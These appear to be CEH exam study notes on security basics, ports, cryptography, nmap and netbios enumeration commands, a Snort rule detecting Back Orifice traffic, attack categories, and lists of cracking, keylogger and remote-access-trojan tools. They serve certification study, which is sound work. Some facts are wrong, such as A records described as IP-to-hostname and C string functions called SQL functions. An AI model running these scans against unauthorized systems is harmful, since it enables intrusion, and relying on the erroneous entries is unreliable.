> [!NOTE]

# Basics of CEH


CIA Triad - Confidentiality, integrity, availability, Authenticity, Non-repudiation


Confidentiality - is important to protect sensitive information from being disclosed to unauthorized parties. This includes protecting data at rest, in transit, and in use. Common techniques used to maintain confidentiality include encryption, access controls, and data masking.

Integrity - is important to ensure that information has not been tampered with or modified in an unauthorized way. This includes protecting data from unauthorized modification, deletion or addition. Common techniques used to maintain integrity include digital signatures, message authentication codes, and data hashing.

Availability - is important to ensure that information and systems are accessible to authorized users when they need them. This includes protecting against denial of service attacks and ensuring that systems are highly available and can withstand failures. Common techniques used to maintain availability include load balancing, redundancy, and disaster recovery planning.

Authenticity - is important to ensure that information and communication come from a trusted source. This includes protecting against impersonation, spoofing and other types of identity fraud. Common techniques used to establish authenticity include authentication, digital certificates, and biometric identification.

Non-repudiation - is important to ensure that a party cannot deny having sent or received a message or transaction. This includes protecting against message tampering and replay attacks. Common techniques used to establish non-repudiation include digital signatures, message authentication codes and timestamps.

# Attack Types

OS: Attacks targeting default OS settings

App level: Application code attacks

Shrink Wrap: off-the-shelf scripts and code

Misconfiguration: not configured well

# Testing Types

Black-box - has none information about the internal work

Gray box  - have some information about the internal work

White box - have full information about the internal work


# 5 PHASES TO A Ethical Hacking


1. Reconnaissance
2. Scanning & Enumeration
3. Gaining Access
4. Maintaining Access
5. Clearing Tracks


### PHASES TO A Penetration Tester (Pen Testing)

1. The Pre-attack 
2. The Attack 
3. The Post-Attack 


### Types of penetration testing

Internal & External Network Penetration Testing

Wireless Penetration Testing

Web Application Testing

Mobile Application Testing

Build and Configuration Review

Social Engineering

Cloud Penetration Testing

Agile Penetration Testing


### OWASP Top 10 CEHv12

Top 10:2021 List

A01 Broken Access Control
A02 Cryptographic Failures
A03 Injection
A04 Insecure Design
A05 Security Misconfiguration
A06 Vulnerable and Outdated Components
A07 Identification and Authentication Failures
A08 Software and Data Integrity Failures
A09 Security Logging and Monitoring Failures
A10 Server Side Request Forgery (SSRF)

### OWASP Top 10 CEHv11

#2017 Top 10
A1:2017-Injection
A2:2017-Broken Authentication
A3:2017-Sensitive Data Exposure
A4:2017-XML External Entities (XXE)
A5:2017-Broken Access Control
A6:2017-Security Misconfiguration
A7:2017-Cross-Site Scripting (XSS)
A8:2017-Insecure Deserialization
A9:2017-Using Components with Known Vulnerabilities
A10:2017-Insufficient Logging & Monitoring


### Legal

#18 U.S.C 1029 & 1030	

RFC 1918 – Private IP Standard	SOX – Corporate Finance Processes

RFC 3227 – Collecting and storing data	GLBA – Personal Finance Data

ISO 27002 – InfoSec Guideline	FERPA – Education Records

CAN-SPAM – email marketing	FISMA – Gov Networks Security Std

SPY-Act – License Enforcement	CVSS – Common Vuln Scoring System

DMCA – Intellectual Property	CVE – Common Vulns and Exposure



### Regional Registry Coverage Map

African Network Coordination Centre (AFRINIC)

American Registry for Internet Numbers (ARIN)	

Asia-Pacific Network Coordination Centre (APNIC)	

Latin American and Caribbean Internet Addresses Registry (LACNIC)	

Réseaux IP Européens Network Coordination Centre (RIPE NCC)	

### Windows The SNMP Management Information Base (MIB)

DHCP.MIB	Microsoft-defined MIB that contains object types for monitoring the network traffic between remote hosts and DHCP servers

HOSTMIB.MIB	Contains object types for monitoring and managing host resources

LMMIB2.MIB	Covers workstation and server services

MIB_II.MIB	Contains the Management Information Base (MIB-II), which provides a simple, workable architecture and system for managing TCP/IP-based internets

WINS.MIB	Microsoft-defined MIB for the Windows Internet Name Service (WINS)

### SNMP

Uses a community string for PW

SNMPv3 encrypts the community strings

### The Common Vulnerability Scoring System (CVSS) 

none 0.0

Low 0.1 -.3.9

Medium 4.0 - 6.9

High 7.0 -8.9

Critical 9.0-10.0


### XOR Logic

0 xor 0 = 0

1 xor 1 = 0

1 xor 0 = 1

0 xor 1 = 1

### Cryptography

#SYMMETRIC ENCRYPTION

Only one key used to encrypt and decrypt

#SYMMETRIC ALGORITHMS

DES: 56bit key (8bit parity); fixed block

3DES: 168bit key; keys ≤ 3 56bit *3

AES: 128, 192, or 256; replaced DES

IDEA: 128bit key

Twofish: Block cipher key size ≤ 256bit

Blowfish: Rep. by AES; 64bit block

RC: incl. RC2 ―› RC6. 2,040key, RC6 (128bit block)

#ASYMMETRIC ENCRYPTION

Public key = Encrypt, Private Key = Decrypt

#ASYMMETRIC ALGORITHMS

Diffie-Hellman: key Exchange, used in SSL/IPSec

ECC: Elliptical Curve. Low process power/Mobile

EI Gamal: !=Primes, log problem to encrypt/sign

RSA: 2 x Prime 4,096bit. Modern std.

#HASH ALGORITHMS
MD5: 128bit hash, expres as 32bit hex

SHA1: 160bit hash,rq 4 use in US apps

SHA2: 4 sep hash 224,256,384,512

Public Key is used in IKE, SSL, and PGP

Hashing provides integrity


# TRUST MODELS

Web of trust: Entities sign certs for each other

Single Authority: CA at top. Trust based on CA itself

Hierarchical: CA at top. RA’s Under to manage certs

XMKS – XML PKI System

#CRYPTOGRAPHY ATTACKS

Known Plain-text: Search plaintext for repeatable sequences. Compare to t versions.

Ciphertext-only: Obtain several messages with same algorithm. Analyze to reveal repeating code.

Replay: Performed in MITM. Repeat exchange to fool system in setting up a comms channel.

#DIGITAL CERTIFICATE	

Used to verify user identity = nonrepudiation	Valid from/to: Certificate good through dates

Version: Identifies format. Common = V1	Key usage: Shows for what purpose cert was made

Serial: Uniquely identify the certificate	Subject’s public key: self-explanatory

Subject: Whoever/whatever being identified by cert	Optional fields: e.g., Issuer ID, Subject Alt Name…

Algorithm ID: Algorithm used	

Issuer: Entity that verifies authenticity of certificate	



### Reconnaissance

#DEFINITION
Gathering information on targets, whereas foot-printing is mapping out at a high level. These are interchangeable in CEH.

#GOOGLE HACKING

Operator: keyword additional search items

site: Search only within domain

ext: File Extension

loc: Maps Location

intitle: keywords in title tag of page

allintitle: any keywords can be in title

inurl: keywords anywhere in url

allinurl: any of the keywords can be in url

incache: search Google cache only

#DNS RECORD TYPES

Service (SRV): hostname & port # of servers

Start of Authority (SOA): Primary name server

Pointer (PTR): IP to Hostname; for reverse DNS

Name Server (NS): NameServers with namespace

Mail Exchange (MX): E-mail servers

CNAME: Aliases in zone. list multi services in DNS

Address (A): IP to Hostname; for DNS lookup

DNS footprinting: whois, nslookup, dig

#DNS

port 53 nslokup (UDP), Zone xfer (TCP)

DNS configured to Open resolver can lead to amplification attack 

#TCP HEADER FLAGS

URG: Indicates data being sent out of band

ACK: Ack to, and after SYN

PSH: Forces delivery without concern for buffering

RST: Forces comms termination in both directions

SYN: Initial comms. Parameters and sequence #’s

FIN: ordered close to communications

#DHCP

Client — Discover-> Server

Client<—Offers—- Server

Client —Request—> Server

Client<—-ACK—- Server

IP is removed from pool


# Scanning & Enumeration

###
passive OS fingerprinting

tcpdump
p0f


#ICMP MESSAGE TYPES	

0: Echo Reply: Answer to type 8 Echo Request	

3: Destination Unreachable: No host/ network Codes	4: Source Quench: Congestion control message

0 ― Destination network unreachable	5: Redirect: 2+ gateways for sender to use or the best route not the configured default gateway

#Codes
1 ― Destination host unreachable	0 ― redirect datagram for the network

6 ― Network unknown	1 ― redirect datagram for the host

7 ― Host unknown	8: Echo Request: Ping message requesting echo

9 ― Network administratively prohibited	11: Time Exceeded: Packet too long be routed

10 ― Host administratively prohibited	

13 ― Communication administratively prohibited	


ping-n 6 192.168.0.101

/n <count>Specifies the number of echo Request messages be sent. The default is 4.

/t Specifies ping continue sending echo Request messages to the destination until interrupted

/s <count>Specifies that the Internet timestamp option in the IP header is used to record the time of arrival for the echo Request message and corresponding echo Reply message for each hop. The count must be a minimum of 1 and a maximum of 4. This is required for link-local destination addresses.

/a Specifies reverse name resolution be performed on the destination IP address. If this is successful, ping displays the corresponding host name.




### CIDR
Method of the representing IP Addresses.

IPV4 NOTATION	Prefix

/30=4	.255.252

/28=16	.255.240

/26=64	.255.192

/24=256	. 255.0

/22=1024	.252.0

/20=4096	.240.0


### PORT NUMBERS

0 — 1023: Well-known

1024 — 49151: Registered

49152 — 65535: Dynamic


### HTTP headers:

Accept - Accept: text/html	

Accept-Charset	- Accept-Charset: utf-8	

Cache-Control	- Cache-Control: no-cache	

Connection	- Connection: keep-alive

Content-Encoding	-  Content-Encoding: gzip	

HTTP2-Settings	- HTTP2-Settings: token64	

Transfer-Encoding	- Transfer-Encoding: chunked	

User-Agent	- User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0


### Common non-standard request fields

X-Forwarded-For - X-Forwarded-For: 129.78.138.66, 129.78.64.103

X-Http-Method-Override  - X-HTTP-Method-Override: DELETE

X-Csrf-Token - X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql


### Standard response fields


Access-Control-Allow-Origin, - Access-Control-Allow-Origin: *	

Access-Control-Allow-Credentials, - Access-Control-Allow-Origin: *
	
Access-Control-Expose-Headers, - Access-Control-Allow-Origin: *	

Access-Control-Max-Age, - Access-Control-Allow-Origin: *	

Access-Control-Allow-Methods, - Access-Control-Allow-Origin: *	

Access-Control-Allow-Headers - Access-Control-Allow-Origin: *	

Allow - Allow: GET, HEAD	

Cache-Control	 - Cache-Control: max-age=3600	

Content-MD5	 - Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==	

Server - Server: Apache/2.4.1 (Unix)	

X-Frame-Options - X-Frame-Options: deny	

Common non-standard response fields

Content-Security-Policy, - X-WebKit-CSP: default-src 'self'

X-Content-Security-Policy, - X-WebKit-CSP: default-src 'self'

X-WebKit-CSP - X-WebKit-CSP: default-src 'self'

Expect-CT - Expect-CT: max-age=604800, enforce, report-uri="https://example.example/report"

X-Content-Type-Options - X-Content-Type-Options: nosniff

X-Powered-By - X-Powered-By: PHP/5.4.0

X-XSS-Protection - X-XSS-Protection: 1; mode=block




### HTTP Methods:

GET
HEAD
OPTIONS
TRACE
DELETE
PUT
POST
PATCH
CONNECT

#HTTP ERROR CODES

##Status code	Meaning
#1xx Informational	 
100	Continue
101	Switching protocols
102	Processing
103	Early Hints
 	 
#2xx Succesful	 
200	OK
201	Created
202	Accepted
203 	Non-Authoritative Information
204	No Content
205	Reset Content
206	Partial Content
207	Multi-Status
208	Already Reported
226	IM Used
 	 
#3xx Redirection	 
300	Multiple Choices
301	Moved Permanently
302	Found (Previously "Moved Temporarily")
303	See Other
304	Not Modified
305	Use Proxy
306	Switch Proxy
307	Temporary Redirect
308	Permanent Redirect
 	 
#4xx Client Error	 
400	Bad Request
401	Unauthorized
402	Payment Required
403	Forbidden
404	Not Found
405	Method Not Allowed
406	Not Acceptable
407	Proxy Authentication Required
408	Request Timeout
409	Conflict
410	Gone
411	Length Required
412	Precondition Failed
413	Payload Too Large
414	URI Too Long
415	Unsupported Media Type
416	Range Not Satisfiable
417	Expectation Failed
418	I'm a Teapot
421	Misdirected Request
422	Unprocessable Entity
423	Locked
424	Failed Dependency
425	Too Early
426	Upgrade Required
428	Precondition Required
429	Too Many Requests
431	Request Header Fields Too Large
451	Unavailable For Legal Reasons
 	 
#5xx Server Error	 
500	Internal Server Error
501	Not Implemented
502	Bad Gateway
503	Service Unavailable
504	Gateway Timeout
505	HTTP Version Not Supported
506	Variant Also Negotiates
507	Insufficient Storage
508	Loop Detected
510	Not Extended
511	Network Authentication Required

### IMPORTANT PORT NUMBERS		
	
FTP:	20/21	

Telnet:	23	

SSH:	22	

SMTP:	25	/ SMTPS 587 / StarTLS 465 Common default non official 2525

WINS:	42	

TACACS:	49	

DNS:	53	TCP/UDP

Kerberos:	88	UDP

NTP 123 TCP 

NetBIOS/SMB:	137-139

SMB v2/v3 over TCP 445

IMAP:	143 / 993 SSL TCP

POP3:	110 /	995 SSL TCP

SNMP:	161/162

LDAP:	389

HTTP:	80 / 8080

HTTPS:	443

CIFS:	445

RADIUS:	1812 UDP TCP

RDP:	3389

IRC:	6667

Printer:	515,631,9100

Portmapper (Linux):	111	

Tini:	7777

NNTP:	119	

NetBus:	12345

NTP:	123	

Back Orifice:	27374

RPC-DCOM:	135	

Sub7:	31337

meterpreter / metasploit 4444


# OSI model 

7	Application	Data	High-level protocols such as for resource sharing or remote file access, e.g. HTTP. ( SOAP; DHCP; HTTPS; HTTP; POP3; SNMP; SMTP; BOOTP; DNS; telent; SSH; IMAP)

6	Presentation	Translation of data between a networking service and an application; including character encoding, data compression and encryption/decryption ( TLS; SSL; AFP; LPP; ICA)

5	Session	Managing communication sessions, i.e., continuous exchange of information in the form of multiple back-and-forth transmissions between two nodes ( PAP; RPC; SMB; SOCKS; SMPP)

4	Transport	Segment, Datagram	Reliable transmission of data segments between points on a network, including segmentation, acknowledgement and multiplexing ( NetBIOS; TCP; UDP; iSCSI; AH; TFTP)

3	Network	Packet	Structuring and managing a multi-node network, including addressing, routing and traffic control (NAT; ICMP; RIP; IP; OSPF; IPsec; Packet filtering)

2	Data link	Frame	Transmission of data frames between two nodes connected by a physical layer (ARP; DTP; Frame rate; STP; L2TP; PPP; PPTP; VLAN Sniffers )

1	Physical	Bit, Symbol	Transmission and reception of raw bit streams over a physical medium  ( Fiber optics; RS232; IEEE 1394 Interfaces; DSL; ISDN)


# NMAP

Nmap is the de-facto tool for this pen-test phase

NMAP <SCAN OPTIONS> <TARGET>

-sA: ACK scan -sF: FIN scan

-sS:SYN -sT: TCP scan

-sI: IDLS scan -sn: PING sweep

-sN: NULL -sS: Stealth Scan

-sR: RPC scan -Po: No ping

-sW: Window -sX: XMAS tree scan

-PI: ICMP ping – PS: SYN ping

-PT: TCP ping -oN: Normal output

-oX: XML output -A OS/Vers/Script

-T<0-5>: Slow – Fast ( 0 least detective)

Nmap  -A 10.10.10.10  (aggressive scan- Traceroute, T4, OS)

nmap  -sC  (service scan)

nmap -sV  (version scan)

nmap  -sP 10.10.10.10/24  (how many hosts are up in the whole network)/ping scan

nmap  -sL  (hostnames)

nmap  -oN <filename>  (to save output in a file)

nmap  -F  (fast scan)

nmap  -O  (os scan)

nmap smb scripts:

nmap --script smb-os-discovery.nse -p445 <ip>  (enumerate os, domain name,etc)

nmap --script smb-enum-users.nse -p445 <ip>  (used to enumerate all users on remote Windows system using SAMR enumeration and LSA bruteforcing)

nmap -p 445 --script=smb-enum-shares.nse, smb-enum-users.nse 10.10.19.21 (smb users and shares)

### NMAP SCAN TYPES

TCP: 3 way handshake on all ports.

Open = SYN/ACK, Closed = RST/ACK

SYN: SYN packets to ports (incomplete handshake).

Open = SYN/ ACK, Closed = RST/ ACK

FIN: Packet with FIN flag set

Open = no response, Closed = RST

XMAS: Multiple flags set (fin, URG, and PSH) Binary Header: 00101001

Open = no response, Closed = RST

ACK: Used for Linux/Unix systems

Open = RST, Closed = no response

IDLE: Spoofed IP, SYN flag, designed for stealth.

Open = SYN/ACK, Closed= RST/ACK

NULL: No flags set. Responses vary by OS. NULL scans are designed for Linux/ Unix machines.


# NETBIOS	

nbstat	

nbtstat -a COMPUTER 190	nbtstat -S 10 -display ses stats every 10 sec

nbtstat -A 192.168.10.12 remote table	1B ==master browser for the subnet

nbtstat -n local name table	1C == domain controller

nbtstat -c local name cache	1D == domain master browser

nbtstat -r -purge name cache	

# Sniffing and Evasion

### IPV4 AND IPV6

IPv4 == unicast, multicast, and broadcast

IPv6 == unicast, multicast, and anycast.

IPv6 unicast and multicast scope includes link local, site local and global.

### MAC ADDRESS

First half = 3 bytes (24bits) = Org UID

Second half = unique number

### NAT (NETWORK ADDRESS TRANSLATION)

Basic NAT is a one-to-one mapping where each internal IP== a unique public IP.

Nat overload (PAT) == port address translation. Typically used as is the cheaper option.

### STATEFUL INSPECTION
Concerned with the connections. Doesn’t sniff ever packet, it just verifies if it’s a known connection, then passes along.

### HTTP TUNNELLING
Crafting of wrapped segments through a port rarely filtered by the Firewall (e.g., 80) to carry payloads that may otherwise be blocked.

### IDS EVASION TACTICS
Slow down OR flood the network (and sneak through in the mix) OR fragmentation

### TCPDUMP SYNTAX
~tcpdump flag(s) interface

#SNORT IDS	
It has 3 modes:	Sniffer/Packet logger/ Network IDS.
Config file: /etc/snort, or c:snortetc #~alert tcp!HOME_NET any ->$HOME_NET 31337 (msg : “BACKDOOR ATTEMPT-Back-orifice.”)	Any packet from any address !=home network. Using any source port, intended for an address in home network on port 31337, send msg.
Span port: port mirroring	False Negative: IDS incorrectly reports stream clean

#LM HASHING
7 spaces hashed: AAD3B435B51404EE

The right sidde of the hash ends with 1404EE the password is less than eight characters

#SAM FILE

C:/Windows/system32/config


# Attacking a System

### C|EH RULES FOR PASSWORDS
Must not contain user’s name. Min 8 chars.
3 of 4 complexity components. E.g., Special, Number, Uppercase, Lowercase

### ATTACK TYPES
Passive Online: Sniffing wire, intercept clean text password / replay / MITM
Active Online: Password guessing.
Offline: Steal copy of password i.e., SAM file. Cracking efforts on a separate system
Non-electronic: Social Engineering

### SIDEJACKING
Steal cookies exchanged between systems and use tp perform a replay-style attack.

# SESSION HIJACKING

Refers to the active attempt to steal an entire established session from a target

1. Sniff traffic between client and server
2. Monitor traffic and predict sequence
3. Desynchronise session with client
4. Predict session token and take over session
5. Inject packets to the target server

AUTHENTICATION TYPES
Type 1: Something you know
Type 2: Something you have
Type 3: Something you are

KERBEROS
Kerberos makes use of symmetric and asymmetric encryption technologies and involves:
KDC: Key Distribution Centre
AS: Authentication Service
TGS: Ticket Granting Service
TGT: Ticket Granting Ticket
Process
1. Client asks KDC (who has AS and TGS) for ticket to authenticate throughout the network. this request is in clear text.
2. Server responds with secret key. hashed by the password copy kept on AD server (TGT).
3. TGT sent back to server requesting TGS if user decrypts.
4. Server responds with ticket, and client can log on and access network resources.

REGISTRY
2 elements make a registry setting: a key (location pointer), and value (define the key setting).
Rot level keys are as follows:
HKEY_LOCAL_MACHINE_Info on Hard/software
HKEY_CLASSES_ROOT ― Info on file associations and Object Linking and Embedding (OLE) classes
HKEY_CURRENT_USER ― Profile info on current user
HKEY_USERS ― User config info for all active users
HEKY_CURRENT-CONFIG―pointer tohardware Profiles.
HEKY_LOCAL-MACHINESoftwareMicrosoftWindowsCurrentVersion
RunServicesOnce
RunServices
Run Once
Run


# Social Engineering

HUMAN BASED ATTACKS

Dumpster diving

Elicitation

Impersonation

Technical Support

Should Surfing

Tailgating/ Piggybacking

Quid pro quo


# COMPUTER BASED ATTACKS
Phishing – Email SCAM

Whaling – Targeting CEO’s

Pharming – Evil Twin Website

# TYPES OF SOCIAL ENGINEERS

Insider Associates: Limited Authorized Access

Insider Affiliates: Insiders by virtue of Affiliation that spoof the identity of the Insider

Outsider Affiliates: Non-trusted outsider that use an access point that was left open

# Physical Security

3 MAJOR CATEGORIES OF PHYSICAL SECURITY MEASURES

Physical measures: Things you taste, touch, smell

Technical measures: smart cards, biometrics

Operational measures: policies and procedures

Prevention, Detection, Recovery

# Web-Based Hacking

CSRF – CROSS SITE REQUEST FORGERY

DOT-DOT-SLASH ATTACK
Variant of Unicode or un-validated input attack

SQL INJECTION ATTACK TYPES

Union Query: Use the UNION command to return the union of target Db with a crafted Db

Tautology: Term used to describe behavior of a Db when deciding if a statement is true.

Blind SQL Injection: Trial and Error with no responses or prompts.

Error based SQL Injection: Enumeration technique. Inject poorly constructed commands to have Db respond with table names and other information

# BUFFER OVERFLOW

A condition that occurs when more data is written to a buffer than it has space to store and results in data corruption. Caused by insufficient bounds checking, a bug, or poor configuration in the program code.

Stack: Premise is all program calls are kept in a stack and performed in order. Try to change a function pointer or variable to allow code exe

Heap: Takes advantage of memory “on top of” the application (dynamically allocated). Use program to overwrite function pointers

NOP Sled: Takes advantage of instruction called “no-op”. Sends a large # of NOP instructions into buffer. Most IDS protect from this attack.

Dangerous SQL functions

The following do not check size of destination buffers: gets() strcpy() stract() printf()


### Wireless  Network Hacking

GSM

Global System for Mobile Communication

Generations: 2G (GSM), 3G (UMTS), 4G (LTE)

Frequency: 900 MHz - 1800 MHz


# WIRELESS SNIFFING

Compatible wireless adapter with promiscuous mode is required, but otherwise pretty much the same as sniffing wired.
802.11 SPECIFICATIONS			
WEP: RC4 with 24bit vector. Kers are 40 or 104bit			
WAP: RC4 supports longer keys; 48bit IV			
WPA/TKIP: Changes IV each frame and key mixing			
WPA2: AES + TKIP features; 48bit IV			
Spec	Dist	Speed	Freq
802.11a	30m	54 Mbps	5GHz
802.11b	100m	11 Mbps	2.4 GHz
802.11g	100m	54 Mbps	2.4 GHz
802.11n	125m	100 Mbps+	2.4/5GHz
802.11ac	5 Ghz	MIMO-OFDM

BLUETOOTH ATTACKS 2.4 Ghz	
Bluesmacking: DoS against a device
Bluejacking: Sending messages to/from devices
Bluesniffing: Sniffs for Bluetooth
Bluesnarfing: actual theft of data from a device

Password protection in apps:

Use Password salting

Password salting is the process of adding additional character in the password to one-way function. This makes the password more difficult to reverse the hash. The function of salting is to defeat the Dictionary Attacks and Rainbow Table attacks.



# Trojans and Other Attacks

### VIRUS TYPES

Boot: Moves boot sector to another location. Almost impossible to remove.

Camo: Disguise as legit files.

Cavity: Hides in empty areas in exe.

Marco: Written in MS Office Macro Language

Multipartite: Attempts to infect files and boot sector at same time.

Metamorphic virus: Rewrites itself when it infects a new file.

Network: Spreads via network shares.

Polymorphic virus: Constantly changing signature makes it hard to detect.

Shell virus: Like boot sector but wrapped around application code, and run on application start.

Stealth: Hides in files, copies itself to deliver payload.

Covert Channel Tunneling Trojan (CCTT) - Enables attackers to gain shell interfaces into and out of a network using authorized channels covertly - RAT

 

# DOS TYPES	
SYN Attack:	Send thousands of SYN packets with a false IP address. Target will attempt SYN/ACK response. All machine resources will be engaged.

SYN Flood:	Send thousands of SYN Packets but never respond to any of the returned SYN/ACK packets. Target will run out of available connections.

ICMP Flood:	Send ICMP Echo packets with a fake source address. Target attempts to respond but reaches a limit of packets sent per second.

Application level:	Send “legitimate” traffic to a web application than it can handle.

Smurf:	Send large number of pings to the broadcast address of the subnet with source IP spoofed to target. Subnet will send ping responses to target.

Fraggle Attack:	Similar to Smurf but uses UDP.

Ping of Death:	Attacker fragments ICMP message to send to target. When the fragments are reassembled, the resultant ICMP packet is larger than max size and crashes the system

# Linux:
LINUX FILE SYSTEM	
/	-Root
/var	-Variable Data / Log Files
/bin	-Biniaries / User Commands
/sbin	-Sys Binaries / Admin Commands
/root	-Home dir for root user
/boot	-Store kernel
/proc	-Direct access to kernel
/dev	-Hardware storage devices
/mnt	-Mount devices

IDENTIFYING USERS AND PROCESSES
INIT process ID 1
Root UID, GID 0
Accounts of Services 1-999
All other users Above 1000

PERMISSIONS
4 – Read
2 – Write
1 – Execute
User/Group/Others
764 – User>RWX, Grp>RW, Other>R

SNORT
action protocol address port -> address port (option:value;option:value)
alert tcp 10.0.0.1 25 -> 10.0.0.2 25
(msg:”Sample Alert”; sid:1000;)

Command Line Tools
NMAP	NMAP -ST -T5 -N -P 1-100 10.0.0.1
Netcat	nc -v -z -w 2 10.0.0.1
TCPdump	tcpdump -i eth0 -v -X ip proto 1
Snort	snort -vde -c my.rules 1
hping	hping3 -I -eth0 -c 10 -a 2.2.2.2 -t 100 10.0.0.1
iptables	iptables -A FORWARD -j ACCEPT -p tcp ―dport 80


# CEH Tools

VULNERABILITY RESEARCH
National Vuln Db
Eccouncil.org
Exploit Database

FOOT-PRINTING
Website Research Tools
Netcraft
Webmaster
Archive

DNS and Whois Tools
Nslookup
Sam Spacde
ARIN
WhereisIP
DNSstuff
DNS-Digger

Website Mirroring
Wget - Banner grabbing attack
Archive
GoogleCache

SYSTEM HACKING TOOLS
Password Hacking
Cain
John the Ripper
LCP
THC-Hydra
ElcomSoft
Aircrack
Rainbow Crack
Brutus
KerbCrack
pwdump7
fgdump
Pyrit


Sniffing
Wireshark
Ace
KerbSniff
Ettercap
Bettercap

Keyloggers and Screen Capture
KeyProwler
Ultimate Keylogger
All in one Keylogger
Actual Spy
Ghost
Hiddern Recorder
Desktop Spy
USB Grabber

Privilege Escalation
Password Recovery Boot Disk
Password Reset
Password Recovery
System Recovery

Executing Applications
PDQ Deploy
RemoteExec
Dameware

Spyware
Remote Desktop Spy
Activity Monitor
OSMomitor
SSPro
Spector Pro

Covering Tracks
ELsave
Cleaner
EraserPro
Evidence Eliminator

Packet Craftin/Spoofing
Komodia
Hping2
PackEth
Packet Generator
Netscan
Scapy
Nemesis

Session Hijacking
Paros Proxy
Burp Suite
Firesheep
Hamster/Ferret
Ettecap
Hunt

SNIFFING

Packet Capture
Wireshark
CACE
tcpdump
Capsa
OmniPeek
Windump
dnsstuff
EtherApe

Wireless
Kismet (Tool which supports Passive scanning)
Netstumbler

MAC Flooding/Spoofing
Macof
SMAC

ARP Poisoning
Cain
UfaSoft
WinARP Attacker

WEB ATTACKS
Wfetch
Httprecon
ID Serve
WebSleuth
Black Widow
CookieDigger
Nstalker
NetBrute

SQL Injection
BSQL Hacker
Marathon
SQL Injection Brute
SQL Brute
SQLNinja
SQLGET
sqlmap


SCANNING AND ENUMERATION
Ping Sweep
Angry IP Scanner
MegaPing

Scanning Tools
SuperScan
NMap (Zenmap)
NetScan Tools Pro
Hping
Netcat



War Dialing
THC-Scan
TeleSweep
ToneLoc
WarVox

Banner Grabbing
Telnet
ID Serve
Netcraft
Xprobe

Vulnerability Scanning
Nessus
SAINT
Retina
Core Impact
Nikto

Network Mapping
NetMapper
LANState
IPSonar

Proxy, Anonymizer, and Tunneling
Tor
ProxySwitcher
ProxyChains
SoftCab
HTTP Tunnel
Anonymouse

Enumeration
SuperScan
User2Sid/Sid2User
LDAP Admin 
Xprobe
Hyena
JXplorer

SNMP Enumeration
SolarWinds
SNMPUtil
SNMPScanner

CRYPTOGRAPHY AND ENCRYPTION

Encryption
TureCrypt
BitLocker
DriveCrpyt
Hash Tools
MD5 Hash
Hash Calc

Steganography
XPTools
ImageHide
Merge Streams
StegParty
gifShuffle
QuickStego
InvisibleSecrets
EZStego
OmniHidePro

Cryptanalysis
Cryptobench

WIRELESS
Discovery
Kismet
NetStumbler
insider
NetSurveyor

Packet Sniffing
Cascade Pilot
Omnipeek
Comm View
Capsa

WEP/WPA Cracking
Aircrack
KisMac
Wireless Security Auditor
WepAttack
WepCrack
coWPatty

Bluetooth
BTBrowser
BH Bluejack
BTScanner
Bluesnarfer

Mobile Device Tracking
Wheres My Droid
Find My Phone
GadgetTrack
iHound

# TROJANS AND MALWARE

Wrappers

Elite Wrap

Monitoring Tools

HiJackThis
CurrPorts
Fport

Attack Tools

Netcat
Nemesis

IDS

Snort

Evasion Tools

ADMutate
NIDSBench
IDSInformer
Inundator

### MoSucker

MoSucker is a visual basic Trojan. MoSucker's edit server program. It has a client with the same layout as sub Seven's client.
MoSucker is a powerful backdoor-hacker's remote access tool. The backdoor renames NETSTAT.EXE to NETSTAT.OLD when it is first activated and renames the file back when it is uninstalled. The backdoor also can install itself in a system with modification of startup keys in the Registry or INI files.

### ProRat

ProRat is a Remote Administration Tool written in C, and capable of working with all Windows OS.

ProRat was designed to allow users to control their own computers remotely from other computers. However, attackers have co-opted it for their own nefarious purposes. Some hackers take control of remote computer systems to conduct a denial of service (DoS) attack, which renders the target system unavailable for normal personal or business uses.

### Theef

Theef is a Windows-based application for both client and server. The Theef server is a virus that you install on a target computer, and the Theef client is what you then use to control the virus.

Theef is a Remote Access Trojan written in Delphi, which gives remote attackers system access via port 9871.

### JPS Virus Maker Tool

JPS Virus Maker is a tool to create viruses. It also has a feature for converting a virus into a worm.


# Internet Worm Maker Thing
Internet Worm Maker Thing is an automated scripting tool used to generate malicious code. It enables you to specify criteria down to the most basic element, including the action you want it to perform, it display language, and its launch date.

# Regshot

The purpose of this software is to compare your registry at two separate points by creating a snapshot of the registry before any system changes or when programs are added, removed, or modified and then taking a second snapshot after the modifications then comparing them.

Regshot is a great utility that you can use to compare the amount of registry entries that have been changed during an installation or a change in your system settings. It is a great tool for troubleshooting and monitoring your registry.

# WinPatrol

TCPView is a Windows program that will show you detailed listings of all TCP and UDP endpoints on your system, including the local and remote addresses and state of TCP connections. On Windows Server 2008, Vista, and XP, TCPView also reports the name of the process that owns the endpoint. TCPView provides a more informative and conveniently presented subset of the Netstat program that ships with Windows. The TCPView download includes Tcpvcon, a command-line version with the same functionality.


# SMTP Telnet technique port 25

SMTP provides 3 built-in-commands:
— VRFY: means validates users.
— EXPN: Tells the actual delivery addresses of aliases and mailing lists.
— RCPT TO: Defines the recipients of the message.


# Cloud Solutions:

Public cloud. As the name suggests, this type of cloud deployment model supports all users who want to use a computing resource, such as hardware (OS, CPU, memory, storage) or software (application server, database) on a subscription basis. The most common uses of public clouds are for application development and testing, non-mission-critical tasks such as file-sharing, and e-mail service.

Private cloud. True to its name, a private cloud is typically infrastructure used by a single organization. The organization itself may manage such infrastructure to support various user groups. It could be managed by a service provider that takes care of it either on-site or off-site. Private clouds are more expensive than public clouds due to the capital expenditure involved in acquiring and maintaining them. However, private clouds are better able to address the security and privacy concerns of organizations today.

Hybrid cloud. In a hybrid cloud, an organization makes use of interconnected private and public cloud infrastructure. Many organizations use this model when they need to rapidly scale up their IT infrastructure, such as when leveraging public clouds to supplement the capacity available within a private cloud. For example, if an online retailer needs more computing resources to run its Web applications during the holiday season, it may attain those resources via public clouds.

Community cloud. This deployment model supports multiple organizations sharing computing resources that are part of a community; examples include universities cooperating in certain areas of research or police departments within a county or state sharing computing resources. Access to a community cloud environment is typically restricted to the members of the community.



# NIST:

Cloud auditor

A cloud auditor is a party that can perform an independent examination of cloud service controls with the intent to express an opinion thereon. Audits are performed to verify conformance to standards through a review of objective evidence.

Cloud broker

https://en.wikipedia.org/wiki/Cloud_broker

Cloud Broker is an entity that manages the use, performance and delivery of cloud services, and negotiates relationships between cloud providers and cloud consumers. As cloud computing evolves, the integration of cloud services may be too complex for cloud consumers to manage alone.

Cloud broker and its interactions with other parties

